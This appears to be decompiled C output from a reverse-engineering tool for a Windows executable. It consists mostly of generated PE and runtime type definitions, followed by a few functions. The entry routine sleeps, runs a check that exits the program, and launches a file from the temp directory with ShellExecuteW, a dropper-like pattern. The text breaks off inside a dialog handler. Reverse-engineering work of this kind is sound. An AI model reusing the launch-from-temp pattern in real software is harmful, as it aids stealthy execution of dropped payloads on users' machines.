typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned long long    ulonglong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef ulonglong __uint64;

typedef struct tagMSG tagMSG, *PtagMSG;

typedef struct tagMSG MSG;

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT;

typedef uint UINT_PTR;

typedef UINT_PTR WPARAM;

typedef long LONG_PTR;

typedef LONG_PTR LPARAM;

typedef ulong DWORD;

typedef struct tagPOINT tagPOINT, *PtagPOINT;

typedef struct tagPOINT POINT;

typedef long LONG;

struct tagPOINT {
    LONG x;
    LONG y;
};

struct tagMSG {
    HWND hwnd;
    UINT message;
    WPARAM wParam;
    LPARAM lParam;
    DWORD time;
    POINT pt;
};

struct HWND__ {
    int unused;
};

typedef struct tagPAINTSTRUCT tagPAINTSTRUCT, *PtagPAINTSTRUCT;

typedef struct tagPAINTSTRUCT PAINTSTRUCT;

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ *HDC;

typedef int BOOL;

typedef struct tagRECT tagRECT, *PtagRECT;

typedef struct tagRECT RECT;

typedef uchar BYTE;

struct HDC__ {
    int unused;
};

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

struct tagPAINTSTRUCT {
    HDC hdc;
    BOOL fErase;
    RECT rcPaint;
    BOOL fRestore;
    BOOL fIncUpdate;
    BYTE rgbReserved[32];
};

typedef struct tagMSG *LPMSG;

typedef struct tagWNDCLASSEXW tagWNDCLASSEXW, *PtagWNDCLASSEXW;

typedef struct tagWNDCLASSEXW WNDCLASSEXW;

typedef LONG_PTR LRESULT;

typedef LRESULT (*WNDPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

typedef struct HINSTANCE__ *HINSTANCE;

typedef struct HICON__ HICON__, *PHICON__;

typedef struct HICON__ *HICON;

typedef HICON HCURSOR;

typedef struct HBRUSH__ HBRUSH__, *PHBRUSH__;

typedef struct HBRUSH__ *HBRUSH;

typedef wchar_t WCHAR;

typedef WCHAR *LPCWSTR;

struct HBRUSH__ {
    int unused;
};

struct HICON__ {
    int unused;
};

struct HINSTANCE__ {
    int unused;
};

struct tagWNDCLASSEXW {
    UINT cbSize;
    UINT style;
    WNDPROC lpfnWndProc;
    int cbClsExtra;
    int cbWndExtra;
    HINSTANCE hInstance;
    HICON hIcon;
    HCURSOR hCursor;
    HBRUSH hbrBackground;
    LPCWSTR lpszMenuName;
    LPCWSTR lpszClassName;
    HICON hIconSm;
};

typedef int INT_PTR;

typedef INT_PTR (*DLGPROC)(HWND, UINT, WPARAM, LPARAM);

typedef struct tagPAINTSTRUCT *LPPAINTSTRUCT;

typedef struct _cpinfo _cpinfo, *P_cpinfo;

struct _cpinfo {
    UINT MaxCharSize;
    BYTE DefaultChar[2];
    BYTE LeadByte[12];
};

typedef struct _cpinfo *LPCPINFO;

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef void *HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _STARTUPINFOW _STARTUPINFOW, *P_STARTUPINFOW;

typedef WCHAR *LPWSTR;

typedef ushort WORD;

typedef BYTE *LPBYTE;

struct _STARTUPINFOW {
    DWORD cb;
    LPWSTR lpReserved;
    LPWSTR lpDesktop;
    LPWSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _STARTUPINFOW *LPSTARTUPINFOW;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

typedef LONG (*PTOP_LEVEL_EXCEPTION_FILTER)(struct _EXCEPTION_POINTERS *);

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef CONTEXT *PCONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef PTOP_LEVEL_EXCEPTION_FILTER LPTOP_LEVEL_EXCEPTION_FILTER;

typedef char CHAR;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef struct _IMAGE_SECTION_HEADER _IMAGE_SECTION_HEADER, *P_IMAGE_SECTION_HEADER;

typedef union _union_226 _union_226, *P_union_226;

union _union_226 {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
};

struct _IMAGE_SECTION_HEADER {
    BYTE Name[8];
    union _union_226 Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD NumberOfRelocations;
    WORD NumberOfLinenumbers;
    DWORD Characteristics;
};

typedef enum _HEAP_INFORMATION_CLASS {
    HeapCompatibilityInformation=0,
    HeapEnableTerminationOnCorruption=1
} _HEAP_INFORMATION_CLASS;

typedef enum _HEAP_INFORMATION_CLASS HEAP_INFORMATION_CLASS;

typedef struct _IMAGE_SECTION_HEADER *PIMAGE_SECTION_HEADER;

typedef WCHAR *LPWCH;

typedef struct _OSVERSIONINFOW _OSVERSIONINFOW, *P_OSVERSIONINFOW;

typedef struct _OSVERSIONINFOW *LPOSVERSIONINFOW;

struct _OSVERSIONINFOW {
    DWORD dwOSVersionInfoSize;
    DWORD dwMajorVersion;
    DWORD dwMinorVersion;
    DWORD dwBuildNumber;
    DWORD dwPlatformId;
    WCHAR szCSDVersion[128];
};

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef CHAR *LPSTR;

typedef DWORD ACCESS_MASK;

typedef DWORD LCID;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR DWORD_PTR;

typedef ULONG_PTR SIZE_T;

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef DWORD *LPDWORD;

typedef struct HACCEL__ HACCEL__, *PHACCEL__;

struct HACCEL__ {
    int unused;
};

typedef struct HACCEL__ *HACCEL;

typedef HINSTANCE HMODULE;

typedef struct HMENU__ HMENU__, *PHMENU__;

typedef struct HMENU__ *HMENU;

struct HMENU__ {
    int unused;
};

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME *LPFILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef int (*FARPROC)(void);

typedef WORD *LPWORD;

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef int INT;

typedef WORD ATOM;

typedef BOOL *LPBOOL;

typedef BYTE *PBYTE;

typedef void *LPCVOID;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct IMAGE_LOAD_CONFIG_DIRECTORY32 IMAGE_LOAD_CONFIG_DIRECTORY32, *PIMAGE_LOAD_CONFIG_DIRECTORY32;

struct IMAGE_LOAD_CONFIG_DIRECTORY32 {
    dword Size;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    dword GlobalFlagsClear;
    dword GlobalFlagsSet;
    dword CriticalSectionDefaultTimeout;
    dword DeCommitFreeBlockThreshold;
    dword DeCommitTotalFreeThreshold;
    pointer32 LockPrefixTable;
    dword MaximumAllocationSize;
    dword VirtualMemoryThreshold;
    dword ProcessHeapFlags;
    dword ProcessAffinityMask;
    word CsdVersion;
    word DependentLoadFlags;
    pointer32 EditList;
    pointer32 SecurityCookie;
    pointer32 SEHandlerTable;
    dword SEHandlerCount;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char *_ptr;
    int _cnt;
    char *_base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char *_tmpfname;
};

typedef struct _iobuf FILE;

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef char *va_list;

typedef uint uintptr_t;

typedef struct _tiddata _tiddata, *P_tiddata;

typedef struct _tiddata *_ptiddata;

typedef struct threadmbcinfostruct threadmbcinfostruct, *Pthreadmbcinfostruct;

typedef struct threadmbcinfostruct *pthreadmbcinfo;

typedef struct threadlocaleinfostruct threadlocaleinfostruct, *Pthreadlocaleinfostruct;

typedef struct threadlocaleinfostruct *pthreadlocinfo;

typedef struct setloc_struct setloc_struct, *Psetloc_struct;

typedef struct setloc_struct _setloc_struct;

typedef struct localerefcount localerefcount, *Plocalerefcount;

typedef struct localerefcount locrefcount;

typedef struct lconv lconv, *Plconv;

typedef struct __lc_time_data __lc_time_data, *P__lc_time_data;

typedef struct _is_ctype_compatible _is_ctype_compatible, *P_is_ctype_compatible;

struct lconv {
    char *decimal_point;
    char *thousands_sep;
    char *grouping;
    char *int_curr_symbol;
    char *currency_symbol;
    char *mon_decimal_point;
    char *mon_thousands_sep;
    char *mon_grouping;
    char *positive_sign;
    char *negative_sign;
    char int_frac_digits;
    char frac_digits;
    char p_cs_precedes;
    char p_sep_by_space;
    char n_cs_precedes;
    char n_sep_by_space;
    char p_sign_posn;
    char n_sign_posn;
    wchar_t *_W_decimal_point;
    wchar_t *_W_thousands_sep;
    wchar_t *_W_int_curr_symbol;
    wchar_t *_W_currency_symbol;
    wchar_t *_W_mon_decimal_point;
    wchar_t *_W_mon_thousands_sep;
    wchar_t *_W_positive_sign;
    wchar_t *_W_negative_sign;
};

struct _is_ctype_compatible {
    ulong id;
    int is_clike;
};

struct setloc_struct {
    wchar_t *pchLanguage;
    wchar_t *pchCountry;
    int iLocState;
    int iPrimaryLen;
    BOOL bAbbrevLanguage;
    BOOL bAbbrevCountry;
    UINT _cachecp;
    wchar_t _cachein[131];
    wchar_t _cacheout[131];
    struct _is_ctype_compatible _Loc_c[5];
    wchar_t _cacheLocaleName[85];
};

struct threadmbcinfostruct {
    int refcount;
    int mbcodepage;
    int ismbcodepage;
    ushort mbulinfo[6];
    uchar mbctype[257];
    uchar mbcasemap[256];
    wchar_t *mblocalename;
};

struct localerefcount {
    char *locale;
    wchar_t *wlocale;
    int *refcount;
    int *wrefcount;
};

struct threadlocaleinfostruct {
    int refcount;
    uint lc_codepage;
    uint lc_collate_cp;
    uint lc_time_cp;
    locrefcount lc_category[6];
    int lc_clike;
    int mb_cur_max;
    int *lconv_intl_refcount;
    int *lconv_num_refcount;
    int *lconv_mon_refcount;
    struct lconv *lconv;
    int *ctype1_refcount;
    ushort *ctype1;
    ushort *pctype;
    uchar *pclmap;
    uchar *pcumap;
    struct __lc_time_data *lc_time_curr;
    wchar_t *locale_name[6];
};

struct _tiddata {
    ulong _tid;
    uintptr_t _thandle;
    int _terrno;
    ulong _tdoserrno;
    uint _fpds;
    ulong _holdrand;
    char *_token;
    wchar_t *_wtoken;
    uchar *_mtoken;
    char *_errmsg;
    wchar_t *_werrmsg;
    char *_namebuf0;
    wchar_t *_wnamebuf0;
    char *_namebuf1;
    wchar_t *_wnamebuf1;
    char *_asctimebuf;
    wchar_t *_wasctimebuf;
    void *_gmtimebuf;
    char *_cvtbuf;
    uchar _con_ch_buf[5];
    ushort _ch_buf_used;
    void *_initaddr;
    void *_initarg;
    void *_pxcptacttab;
    void *_tpxcptinfoptrs;
    int _tfpecode;
    pthreadmbcinfo ptmbcinfo;
    pthreadlocinfo ptlocinfo;
    int _ownlocale;
    ulong _NLG_dwCode;
    void *_terminate;
    void *_unexpected;
    void *_translator;
    void *_purecall;
    void *_curexception;
    void *_curcontext;
    int _ProcessingThrow;
    void *_curexcspec;
    void *_pFrameInfoChain;
    _setloc_struct _setloc_data;
    void *_reserved1;
    void *_reserved2;
    void *_reserved3;
    void *_reserved4;
    void *_reserved5;
    int _cxxReThrow;
    ulong __initDomain;
    int _initapartment;
};

struct __lc_time_data {
    char *wday_abbr[7];
    char *wday[7];
    char *month_abbr[12];
    char *month[12];
    char *ampm[2];
    char *ww_sdatefmt;
    char *ww_ldatefmt;
    char *ww_timefmt;
    int ww_caltype;
    int refcount;
    wchar_t *_W_wday_abbr[7];
    wchar_t *_W_wday[7];
    wchar_t *_W_month_abbr[12];
    wchar_t *_W_month[12];
    wchar_t *_W_ampm[2];
    wchar_t *_W_ww_sdatefmt;
    wchar_t *_W_ww_ldatefmt;
    wchar_t *_W_ww_timefmt;
    wchar_t *_W_ww_locale_name;
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Structure
};

typedef struct _LocaleUpdate _LocaleUpdate, *P_LocaleUpdate;

struct _LocaleUpdate { // PlaceHolder Structure
};

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Structure
};

typedef int (*_onexit_t)(void);

typedef uint size_t;

typedef ushort wint_t;

typedef struct localeinfo_struct localeinfo_struct, *Plocaleinfo_struct;

struct localeinfo_struct {
    pthreadlocinfo locinfo;
    pthreadmbcinfo mbcinfo;
};

typedef int errno_t;

typedef size_t rsize_t;

typedef int intptr_t;

typedef struct localeinfo_struct *_locale_t;

typedef ushort wctype_t;




void FUN_00401000(HINSTANCE param_1)

{
  short sVar1;
  bool bVar2;
  undefined3 extraout_var;
  int iVar3;
  short *local_23c;
  short *local_238;
  WCHAR local_234;
  undefined local_232 [522];
  uint local_28;
  HACCEL local_8;
  
  local_28 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  LoadStringW(param_1,0x67,(LPWSTR)&DAT_00417de0,100);
  LoadStringW(param_1,0x6d,(LPWSTR)&DAT_00417d18,100);
  FUN_00401240(param_1);
  bVar2 = FUN_004012c0(param_1);
  if (CONCAT31(extraout_var,bVar2) != 0) {
    local_8 = LoadAcceleratorsW(param_1,(LPCWSTR)0x6d);
    Sleep(2000);
    FUN_00403850();
    iVar3 = FUN_004029f0();
    if (iVar3 != 0) {
      FUN_004040e0();
                    // WARNING: Subroutine does not return
      ExitProcess(0);
    }
    iVar3 = FUN_004014a0();
    if (iVar3 != 0) {
      if ((DAT_0041846c & 7) != 0) {
        FUN_00401ce0();
      }
      if ((DAT_00418748 != 0) && (DAT_0041874c != 0)) {
        FUN_00404890(DAT_00418748);
        DAT_00416f2c._0_2_ = DAT_0041874c;
      }
      local_238 = &DAT_00414588;
      local_23c = &DAT_00418c80;
      do {
        sVar1 = *local_238;
        *local_23c = sVar1;
        local_238 = local_238 + 1;
        local_23c = local_23c + 1;
      } while (sVar1 != 0);
      FUN_00404900();
      local_234 = L'\0';
      _memset(local_232,0,0x206);
      GetTempPathW(0x104,&local_234);
      _wcscat_s(&local_234,0x104,&DAT_00418c80);
      Sleep(500);
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_234,(LPCWSTR)&DAT_004145a0,(LPCWSTR)0x0,1);
                    // WARNING: Subroutine does not return
      ExitProcess(0);
    }
  }
  ___security_check_cookie_4(local_28 ^ (uint)&stack0xfffffffc);
  return;
}



void __cdecl FUN_00401240(HINSTANCE param_1)

{
  WNDCLASSEXW local_34;
  
  local_34.cbSize = 0x30;
  local_34.style = 3;
  local_34.lpfnWndProc = FUN_00401320;
  local_34.cbClsExtra = 0;
  local_34.cbWndExtra = 0;
  local_34.hInstance = param_1;
  local_34.hIcon = LoadIconW(param_1,(LPCWSTR)0x6b);
  local_34.hCursor = LoadCursorW((HINSTANCE)0x0,(LPCWSTR)0x7f00);
  local_34.hbrBackground = (HBRUSH)0x6;
  local_34.lpszMenuName = (LPCWSTR)0x6d;
  local_34.lpszClassName = (LPCWSTR)&DAT_00417d18;
  local_34.hIconSm = LoadIconW(local_34.hInstance,(LPCWSTR)0x6c);
  RegisterClassExW(&local_34);
  return;
}



bool __cdecl FUN_004012c0(HINSTANCE param_1)

{
  HWND pHVar1;
  
  DAT_00417ea8 = param_1;
  pHVar1 = CreateWindowExW(0,(LPCWSTR)&DAT_00417d18,(LPCWSTR)&DAT_00417de0,0xcf0000,-0x80000000,0,
                           -0x80000000,0,(HWND)0x0,(HMENU)0x0,param_1,(LPVOID)0x0);
  return pHVar1 != (HWND)0x0;
}



void FUN_00401320(HWND param_1,UINT param_2,uint param_3,LPARAM param_4)

{
  tagPAINTSTRUCT local_4c;
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  if (param_2 == 2) {
    PostQuitMessage(0);
  }
  else if (param_2 == 0xf) {
    BeginPaint(param_1,&local_4c);
    EndPaint(param_1,&local_4c);
  }
  else if (param_2 == 0x111) {
    if ((param_3 & 0xffff) == 0x68) {
      DialogBoxParamW(DAT_00417ea8,(LPCWSTR)0x67,param_1,FUN_00401430,0);
    }
    else if ((param_3 & 0xffff) == 0x69) {
      DestroyWindow(param_1);
    }
    else {
      DefWindowProcW(param_1,0x111,param_3,param_4);
    }
  }
  else {
    DefWindowProcW(param_1,param_2,param_3,param_4);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 FUN_00401430(HWND param_1,int param_2,ushort param_3)

{
  undefined4 uVar1;
  
  if (param_2 == 0x110) {
    uVar1 = 1;
  }
